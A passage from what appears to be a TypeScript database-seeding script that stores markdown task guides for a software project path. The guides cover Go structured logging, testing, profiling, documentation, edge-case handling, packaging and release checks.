				['Add logging', 'Structured logging (JSON) with levels: debug, info, warn, error. Include: timestamp, component, message, relevant data. Configure output destination and level.',
`## Structured Logging

### Logger Setup
\`\`\`go
import "log/slog"

func SetupLogger(cfg LogConfig) *slog.Logger {
    var handler slog.Handler

    opts := &slog.HandlerOptions{
        Level: parseLevel(cfg.Level),
    }

    if cfg.Format == "json" {
        handler = slog.NewJSONHandler(os.Stdout, opts)
    } else {
        handler = slog.NewTextHandler(os.Stdout, opts)
    }

    logger := slog.New(handler)
    slog.SetDefault(logger)

    return logger
}

func parseLevel(level string) slog.Level {
    switch level {
    case "debug":
        return slog.LevelDebug
    case "warn":
        return slog.LevelWarn
    case "error":
        return slog.LevelError
    default:
        return slog.LevelInfo
    }
}
\`\`\`

### Logging Patterns
\`\`\`go
// Add context to logger
func (s *Server) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    requestID := uuid.New().String()
    logger := s.logger.With(
        "request_id", requestID,
        "method", r.Method,
        "path", r.URL.Path,
    )

    logger.Info("request started")

    start := time.Now()
    // ... handle request ...
    duration := time.Since(start)

    logger.Info("request completed",
        "status", status,
        "duration_ms", duration.Milliseconds(),
    )
}

// Component-specific loggers
type OrderService struct {
    logger *slog.Logger
}

func NewOrderService(logger *slog.Logger) *OrderService {
    return &OrderService{
        logger: logger.With("component", "order_service"),
    }
}

func (s *OrderService) ProcessOrder(order Order) error {
    s.logger.Info("processing order",
        "order_id", order.ID,
        "customer_id", order.CustomerID,
        "total", order.Total,
    )
    // ...
}
\`\`\`

### Log Output
\`\`\`json
// JSON format (production)
{"time":"2024-01-15T10:30:00Z","level":"INFO","msg":"request started","request_id":"abc123","method":"GET","path":"/api/users"}
{"time":"2024-01-15T10:30:00Z","level":"INFO","msg":"request completed","request_id":"abc123","status":200,"duration_ms":45}

// Text format (development)
2024-01-15T10:30:00Z INFO request started request_id=abc123 method=GET path=/api/users
2024-01-15T10:30:00Z INFO request completed request_id=abc123 status=200 duration_ms=45
\`\`\`

### Log Levels
\`\`\`go
// DEBUG: Detailed diagnostic info
logger.Debug("cache lookup", "key", key, "hit", hit)

// INFO: Normal operations
logger.Info("user created", "user_id", user.ID)

// WARN: Recoverable issues
logger.Warn("rate limit approaching", "user_id", userID, "requests", count)

// ERROR: Failures that need attention
logger.Error("failed to process payment",
    "error", err,
    "order_id", order.ID,
    "amount", order.Total,
)
\`\`\`

### Don't Log
\`\`\`go
// Never log sensitive data
logger.Info("user login", "password", password)  // BAD
logger.Info("user login", "user_id", userID)     // GOOD

// Avoid logging in tight loops (performance)
for _, item := range items {
    logger.Debug("processing", "item", item)  // May be too much
}
\`\`\`

## Completion Criteria
- [ ] Structured logging configured
- [ ] Log levels used appropriately
- [ ] Request/operation context included
- [ ] Sensitive data not logged`],

				['Write tests', 'Unit tests for functions, integration tests for components. Cover: happy path, edge cases, error conditions. Aim for high coverage of critical paths. Run in CI.',
`## Testing Strategy

### Unit Tests
\`\`\`go
func TestCalculateTotal(t *testing.T) {
    tests := []struct {
        name     string
        items    []Item
        discount float64
        want     float64
    }{
        {
            name:     "no items",
            items:    nil,
            discount: 0,
            want:     0,
        },
        {
            name:     "single item",
            items:    []Item{{Price: 100}},
            discount: 0,
            want:     100,
        },
        {
            name:     "with discount",
            items:    []Item{{Price: 100}},
            discount: 0.1,
            want:     90,
        },
        {
            name:     "multiple items with discount",
            items:    []Item{{Price: 50}, {Price: 50}},
            discount: 0.2,
            want:     80,
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            got := CalculateTotal(tt.items, tt.discount)
            if got != tt.want {
                t.Errorf("CalculateTotal() = %v, want %v", got, tt.want)
            }
        })
    }
}
\`\`\`

### Integration Tests
\`\`\`go
func TestUserAPI(t *testing.T) {
    // Setup test database
    db := setupTestDB(t)
    defer db.Close()

    // Setup test server
    srv := httptest.NewServer(NewRouter(db))
    defer srv.Close()

    t.Run("create and get user", func(t *testing.T) {
        // Create user
        body := strings.NewReader(\`{"email":"test@example.com"}\`)
        resp, err := http.Post(srv.URL+"/api/users", "application/json", body)
        require.NoError(t, err)
        require.Equal(t, http.StatusCreated, resp.StatusCode)

        var created User
        json.NewDecoder(resp.Body).Decode(&created)
        require.NotEmpty(t, created.ID)

        // Get user
        resp, err = http.Get(srv.URL + "/api/users/" + created.ID)
        require.NoError(t, err)
        require.Equal(t, http.StatusOK, resp.StatusCode)

        var fetched User
        json.NewDecoder(resp.Body).Decode(&fetched)
        require.Equal(t, created.ID, fetched.ID)
        require.Equal(t, "test@example.com", fetched.Email)
    })

    t.Run("get nonexistent user returns 404", func(t *testing.T) {
        resp, err := http.Get(srv.URL + "/api/users/nonexistent")
        require.NoError(t, err)
        require.Equal(t, http.StatusNotFound, resp.StatusCode)
    })
}
\`\`\`

### Test Helpers
\`\`\`go
// Setup and teardown
func setupTestDB(t *testing.T) *sql.DB {
    t.Helper()
    db, err := sql.Open("postgres", os.Getenv("TEST_DATABASE_URL"))
    require.NoError(t, err)

    // Run migrations
    RunMigrations(db)

    // Cleanup after test
    t.Cleanup(func() {
        db.Exec("TRUNCATE users, orders CASCADE")
        db.Close()
    })

    return db
}

// Mocking
type MockEmailSender struct {
    SentEmails []Email
}

func (m *MockEmailSender) Send(email Email) error {
    m.SentEmails = append(m.SentEmails, email)
    return nil
}
\`\`\`

### Test Coverage
\`\`\`bash
# Run with coverage
go test -coverprofile=coverage.out ./...

# View coverage report
go tool cover -html=coverage.out

# Minimum coverage in CI
go test -coverprofile=coverage.out ./...
COVERAGE=$(go tool cover -func=coverage.out | grep total | awk '{print $3}' | tr -d '%')
if [ "$COVERAGE" -lt 80 ]; then
    echo "Coverage $COVERAGE% is below 80%"
    exit 1
fi
\`\`\`

## Completion Criteria
- [ ] Unit tests for core logic
- [ ] Integration tests for API
- [ ] Edge cases covered
- [ ] Tests run in CI`],
			]},
			{ name: 'Polish', desc: 'Production ready', tasks: [
				['Optimize performance', 'Profile to find bottlenecks: CPU (pprof), memory. Optimize hot paths. Benchmark before/after changes. Balance: performance vs code clarity vs development time.',
`## Performance Optimization

### Profiling (Go)
\`\`\`go
import _ "net/http/pprof"

func main() {
    // Enable pprof endpoint
    go func() {
        http.ListenAndServe("localhost:6060", nil)
    }()
    // ...
}

// Profile CPU
// curl http://localhost:6060/debug/pprof/profile?seconds=30 > cpu.prof
// go tool pprof cpu.prof

// Profile memory
// curl http://localhost:6060/debug/pprof/heap > heap.prof
// go tool pprof heap.prof
\`\`\`

### Benchmarking
\`\`\`go
func BenchmarkSearch(b *testing.B) {
    // Setup
    db := setupBenchDB()
    defer db.Close()

    // Reset timer after setup
    b.ResetTimer()

    for i := 0; i < b.N; i++ {
        Search(db, "test query")
    }
}

func BenchmarkSearchParallel(b *testing.B) {
    db := setupBenchDB()
    defer db.Close()

    b.ResetTimer()
    b.RunParallel(func(pb *testing.PB) {
        for pb.Next() {
            Search(db, "test query")
        }
    })
}

// Run benchmarks
// go test -bench=. -benchmem -count=5
\`\`\`

### Common Optimizations
\`\`\`go
// 1. Reduce allocations
// Bad: creates new slice every call
func Process(items []Item) []Result {
    results := make([]Result, 0)  // Grows dynamically
    for _, item := range items {
        results = append(results, processItem(item))
    }
    return results
}

// Good: pre-allocate
func Process(items []Item) []Result {
    results := make([]Result, 0, len(items))  // Capacity set
    for _, item := range items {
        results = append(results, processItem(item))
    }
    return results
}

// 2. Use sync.Pool for frequent allocations
var bufferPool = sync.Pool{
    New: func() interface{} {
        return new(bytes.Buffer)
    },
}

func Process() {
    buf := bufferPool.Get().(*bytes.Buffer)
    defer func() {
        buf.Reset()
        bufferPool.Put(buf)
    }()
    // Use buf...
}

// 3. Batch database operations
// Bad: N queries
for _, id := range ids {
    user, _ := db.GetUser(id)
}

// Good: 1 query
users, _ := db.GetUsers(ids)
\`\`\`

### Caching
\`\`\`go
type Cache struct {
    data sync.Map
}

func (c *Cache) Get(key string) (interface{}, bool) {
    return c.data.Load(key)
}

func (c *Cache) Set(key string, value interface{}, ttl time.Duration) {
    c.data.Store(key, value)
    time.AfterFunc(ttl, func() {
        c.data.Delete(key)
    })
}

// Use in service
func (s *Service) GetUser(id string) (*User, error) {
    if cached, ok := s.cache.Get("user:" + id); ok {
        return cached.(*User), nil
    }

    user, err := s.db.GetUser(id)
    if err == nil {
        s.cache.Set("user:"+id, user, 5*time.Minute)
    }
    return user, err
}
\`\`\`

## Completion Criteria
- [ ] Profile application under load
- [ ] Identify and fix bottlenecks
- [ ] Benchmark critical paths
- [ ] Add caching where beneficial`],

				['Add documentation', 'README: what, why, quick start. API docs: all public functions/endpoints. Architecture doc for contributors. Examples and tutorials for common use cases.',
`## Documentation

### README Structure
\`\`\`markdown
# Project Name

Brief description of what this project does.

## Features
- Feature 1
- Feature 2

## Quick Start

\`\`\`bash
# Install
go install github.com/user/project@latest

# Run
project server --port 8080

# Or with Docker
docker run -p 8080:8080 user/project
\`\`\`

## Configuration

See [config.example.yaml](config.example.yaml) for all options.

Key settings:
- \`server.port\`: HTTP port (default: 8080)
- \`database.url\`: Database connection string

## API

See [API Documentation](docs/api.md)

## Development

\`\`\`bash
# Clone
git clone https://github.com/user/project
cd project

# Install dependencies
go mod download

# Run tests
make test

# Run locally
make run
\`\`\`

## License

MIT
\`\`\`

### API Documentation
\`\`\`markdown
# API Reference

Base URL: \`https://api.example.com/v1\`

## Authentication

Include API key in header:
\`\`\`
Authorization: Bearer <api_key>
\`\`\`

## Endpoints

### Users

#### List Users
\`GET /users\`

Parameters:
| Name | Type | Description |
|------|------|-------------|
| page | int | Page number (default: 1) |
| limit | int | Items per page (default: 20) |

Response:
\`\`\`json
{
  "data": [{"id": "1", "email": "user@example.com"}],
  "meta": {"total": 100, "page": 1}
}
\`\`\`

#### Create User
\`POST /users\`

Body:
\`\`\`json
{"email": "user@example.com", "name": "User Name"}
\`\`\`

Response: \`201 Created\`
\`\`\`

### Architecture Documentation
\`\`\`markdown
# Architecture

## Overview

[Diagram or description]

## Components

### API Server
Handles HTTP requests, authentication, routing.
- Location: \`internal/server/\`
- Entry point: \`cmd/server/main.go\`

### Service Layer
Business logic, validation, orchestration.
- Location: \`internal/service/\`

### Data Layer
Database access, caching.
- Location: \`internal/storage/\`

## Data Flow
1. Request → Router → Handler
2. Handler → Service (business logic)
3. Service → Repository (data access)
4. Response ← Handler ← Service ← Repository

## Key Decisions
- [Why we chose X over Y]
- [Trade-offs made]
\`\`\`

### Code Documentation
\`\`\`go
// Package user provides user management functionality.
package user

// User represents a registered user in the system.
type User struct {
    ID    string \`json:"id"\`
    Email string \`json:"email"\`
}

// Service handles user-related operations.
type Service struct {
    repo Repository
}

// Create creates a new user with the given email.
// Returns ErrDuplicateEmail if a user with this email already exists.
func (s *Service) Create(email string) (*User, error) {
    // ...
}
\`\`\`

## Completion Criteria
- [ ] README with quick start
- [ ] API documentation complete
- [ ] Architecture documented
- [ ] Code comments for public API`],

				['Handle edge cases', 'Empty input, very large input, malformed data, concurrent access, resource exhaustion. Add validation and graceful degradation. Document limitations.',
`## Edge Case Handling

### Input Validation
\`\`\`go
func ValidateUser(u *User) error {
    // Empty input
    if u.Email == "" {
        return errors.New("email is required")
    }

    // Format validation
    if !isValidEmail(u.Email) {
        return errors.New("invalid email format")
    }

    // Length limits
    if len(u.Name) > 100 {
        return errors.New("name too long (max 100 chars)")
    }

    // Dangerous characters
    if containsControlChars(u.Name) {
        return errors.New("name contains invalid characters")
    }

    return nil
}

// At API boundary
func (h *Handler) CreateUser(w http.ResponseWriter, r *http.Request) {
    // Limit request body size
    r.Body = http.MaxBytesReader(w, r.Body, 1<<20) // 1MB

    var user User
    if err := json.NewDecoder(r.Body).Decode(&user); err != nil {
        respondError(w, http.StatusBadRequest, "invalid JSON")
        return
    }

    if err := ValidateUser(&user); err != nil {
        respondError(w, http.StatusBadRequest, err.Error())
        return
    }
    // ...
}
\`\`\`

### Large Input
\`\`\`go
// Pagination for large result sets
func ListUsers(page, limit int) ([]User, error) {
    if limit > 100 {
        limit = 100  // Cap maximum
    }
    offset := (page - 1) * limit
    return db.Query("SELECT * FROM users LIMIT ? OFFSET ?", limit, offset)
}

// Streaming for large files
func ProcessLargeFile(path string) error {
    file, err := os.Open(path)
    if err != nil {
        return err
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        processLine(scanner.Text())
    }
    return scanner.Err()
}
\`\`\`

### Concurrent Access
\`\`\`go
// Use mutex for shared state
type Counter struct {
    mu    sync.Mutex
    value int
}

func (c *Counter) Inc() {
    c.mu.Lock()
    defer c.mu.Unlock()
    c.value++
}

// Database: use transactions and handle conflicts
func UpdateBalance(userID string, amount int) error {
    tx, err := db.Begin()
    if err != nil {
        return err
    }
    defer tx.Rollback()

    // SELECT FOR UPDATE to lock row
    var balance int
    err = tx.QueryRow(
        "SELECT balance FROM accounts WHERE user_id = $1 FOR UPDATE",
        userID,
    ).Scan(&balance)
    if err != nil {
        return err
    }

    if balance+amount < 0 {
        return errors.New("insufficient balance")
    }

    _, err = tx.Exec(
        "UPDATE accounts SET balance = balance + $1 WHERE user_id = $2",
        amount, userID,
    )
    if err != nil {
        return err
    }

    return tx.Commit()
}
\`\`\`

### Resource Exhaustion
\`\`\`go
// Connection pool limits
db.SetMaxOpenConns(25)
db.SetMaxIdleConns(5)
db.SetConnMaxLifetime(5 * time.Minute)

// Rate limiting
limiter := rate.NewLimiter(rate.Limit(100), 10)  // 100/sec, burst 10

func (h *Handler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    if !limiter.Allow() {
        http.Error(w, "rate limit exceeded", http.StatusTooManyRequests)
        return
    }
    // ...
}

// Timeouts
ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
defer cancel()

result, err := doSlowOperation(ctx)
if errors.Is(err, context.DeadlineExceeded) {
    // Handle timeout
}
\`\`\`

### Document Limitations
\`\`\`markdown
## Known Limitations

- Maximum request body size: 1MB
- Maximum results per page: 100
- Rate limit: 100 requests/second per API key
- File upload size: 10MB

## Not Supported
- Unicode in usernames (ASCII only)
- Concurrent updates to same resource (last write wins)
\`\`\`

## Completion Criteria
- [ ] Input validation at boundaries
- [ ] Large input handled gracefully
- [ ] Concurrent access safe
- [ ] Resource limits documented`],

				['Package for distribution', 'Build scripts for all platforms. Installers: brew, apt, npm, pip. Docker image. Release process: version bump, changelog, tag, publish. Signed binaries if applicable.',
`## Distribution & Packaging

### Cross-Platform Builds
\`\`\`makefile
# Makefile
VERSION := $(shell git describe --tags --always)
LDFLAGS := -X main.version=$(VERSION)

.PHONY: build-all
build-all:
	GOOS=linux GOARCH=amd64 go build -ldflags "$(LDFLAGS)" -o dist/myapp-linux-amd64
	GOOS=linux GOARCH=arm64 go build -ldflags "$(LDFLAGS)" -o dist/myapp-linux-arm64
	GOOS=darwin GOARCH=amd64 go build -ldflags "$(LDFLAGS)" -o dist/myapp-darwin-amd64
	GOOS=darwin GOARCH=arm64 go build -ldflags "$(LDFLAGS)" -o dist/myapp-darwin-arm64
	GOOS=windows GOARCH=amd64 go build -ldflags "$(LDFLAGS)" -o dist/myapp-windows-amd64.exe
\`\`\`

### Docker Image
\`\`\`dockerfile
# Multi-stage build
FROM golang:1.21-alpine AS builder
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 go build -o /myapp ./cmd/server

FROM alpine:3.18
RUN apk --no-cache add ca-certificates
COPY --from=builder /myapp /usr/local/bin/
EXPOSE 8080
CMD ["myapp", "server"]
\`\`\`

\`\`\`bash
# Build and push
docker build -t user/myapp:latest .
docker push user/myapp:latest
\`\`\`

### Homebrew Formula
\`\`\`ruby
# Formula/myapp.rb
class Myapp < Formula
  desc "Description of myapp"
  homepage "https://github.com/user/myapp"
  url "https://github.com/user/myapp/archive/v1.0.0.tar.gz"
  sha256 "abc123..."

  depends_on "go" => :build

  def install
    system "go", "build", "-o", bin/"myapp", "./cmd/myapp"
  end

  test do
    system "#{bin}/myapp", "--version"
  end
end
\`\`\`

### GitHub Release Workflow
\`\`\`yaml
# .github/workflows/release.yml
name: Release
on:
  push:
    tags: ['v*']

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - uses: actions/setup-go@v4
        with:
          go-version: '1.21'

      - name: Build binaries
        run: make build-all

      - name: Create release
        uses: softprops/action-gh-release@v1
        with:
          files: dist/*
          generate_release_notes: true
\`\`\`

### Release Process
\`\`\`bash
# 1. Update version
vim version.go  # Update version constant

# 2. Update changelog
vim CHANGELOG.md

# 3. Commit
git add -A
git commit -m "Release v1.2.0"

# 4. Tag
git tag -a v1.2.0 -m "Version 1.2.0"

# 5. Push (triggers release workflow)
git push origin main --tags
\`\`\`

### Changelog Format
\`\`\`markdown
# Changelog

## [1.2.0] - 2024-01-15
### Added
- New search feature
- API rate limiting

### Changed
- Improved error messages

### Fixed
- Bug in user deletion

## [1.1.0] - 2024-01-01
...
\`\`\`

## Completion Criteria
- [ ] Builds for all target platforms
- [ ] Docker image published
- [ ] Package manager support
- [ ] Automated release process`],

				['Final testing', 'End-to-end tests simulating real usage. Test on clean machine. Verify documentation accuracy. Security review. Performance benchmarks. User acceptance testing.',
`## Final Testing Checklist

### End-to-End Testing
\`\`\`bash
# E2E test scenario
#!/bin/bash
set -e

BASE_URL="http://localhost:8080"

# 1. Health check
curl -f "$BASE_URL/health"

# 2. Create user
USER_ID=$(curl -s -X POST "$BASE_URL/api/users" \\
  -H "Content-Type: application/json" \\
  -d '{"email":"test@example.com"}' | jq -r '.id')

# 3. Get user
curl -f "$BASE_URL/api/users/$USER_ID"

# 4. Update user
curl -f -X PUT "$BASE_URL/api/users/$USER_ID" \\
  -H "Content-Type: application/json" \\
  -d '{"name":"Updated Name"}'

# 5. List users
curl -f "$BASE_URL/api/users"

# 6. Delete user
curl -f -X DELETE "$BASE_URL/api/users/$USER_ID"

echo "All E2E tests passed!"
\`\`\`

### Clean Machine Test
\`\`\`markdown
## Test on Fresh Environment

1. Spin up clean VM/container
2. Follow README installation steps exactly
3. Verify:
   - [ ] Dependencies install correctly
   - [ ] Application starts
   - [ ] Basic functionality works
   - [ ] No missing files or configs
\`\`\`

### Documentation Verification
\`\`\`markdown
## Docs Checklist

- [ ] README steps work exactly as written
- [ ] All API examples work
- [ ] Config options match actual behavior
- [ ] Error messages match documentation
- [ ] No broken links
- [ ] Screenshots up to date
\`\`\`

### Security Review
\`\`\`markdown
## Security Checklist

### Authentication/Authorization
- [ ] All endpoints require auth (except public)
- [ ] Tokens expire appropriately
- [ ] Failed auth logged

### Input Validation
- [ ] All user input validated
- [ ] No SQL injection (parameterized queries)
- [ ] No XSS (output encoding)
- [ ] No command injection

### Data Protection
- [ ] Secrets not logged
- [ ] Sensitive data encrypted
- [ ] HTTPS enforced

### Dependencies
- [ ] Run \`npm audit\` / \`go mod verify\`
- [ ] No known vulnerabilities
\`\`\`

### Performance Benchmarks
\`\`\`bash
# Load testing with hey
hey -n 10000 -c 100 http://localhost:8080/api/users

# Expected results:
# - p99 latency < 100ms
# - Error rate < 0.1%
# - Throughput > 1000 req/sec

# Memory under load
# - No memory leaks (stable heap)
# - Stays within limits
\`\`\`

### Pre-Release Checklist
\`\`\`markdown
## Final Checklist

### Code
- [ ] All tests passing
- [ ] No compiler warnings
- [ ] Linting clean
- [ ] Test coverage > 80%

### Documentation
- [ ] README complete
- [ ] API docs complete
- [ ] CHANGELOG updated
- [ ] LICENSE file present

### Build
- [ ] Version number updated
- [ ] All platforms build
- [ ] Docker image works

### Security
- [ ] Security review complete
- [ ] Dependency audit clean

### Testing
- [ ] E2E tests pass
- [ ] Clean machine test pass
- [ ] Performance benchmarks acceptable

### Release
- [ ] Git tag created
- [ ] Release notes written
- [ ] Artifacts uploaded
\`\`\`

## Completion Criteria
- [ ] E2E tests pass
- [ ] Works on clean machine
- [ ] Documentation accurate
- [ ] Security review complete
- [ ] Performance acceptable`],
			]},
		]);
	}
}

console.log('Done adding tasks to empty paths!');

const finalCount = db.prepare(`
	SELECT COUNT(*) as paths,
	(SELECT COUNT(*) FROM modules) as modules,
	(SELECT COUNT(*) FROM tasks) as tasks
	FROM paths
`).get() as { paths: number; modules: number; tasks: number };

console.log(`Final counts: ${finalCount.paths} paths, ${finalCount.modules} modules, ${finalCount.tasks} tasks`);

db.close();
